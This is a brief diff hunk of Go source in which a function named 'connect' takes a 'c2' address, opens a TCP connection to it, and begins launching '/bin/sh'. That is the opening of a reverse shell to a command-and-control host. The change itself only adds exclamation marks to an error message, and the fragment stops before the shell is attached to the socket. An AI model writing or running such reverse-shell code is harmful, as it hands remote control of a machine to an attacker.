@@ -10,7 +10,7 @@ import (
 func connect(c2 string) {
 	c, err := net.Dial("tcp", c2)
 	if nil != err {
-		log.Fatalf("Could not open TCP connection")
+		log.Fatalf("Could not open TCP connection!!")
 	}
 	defer c.Close()
 	cmd := exec.Command("/bin/sh")
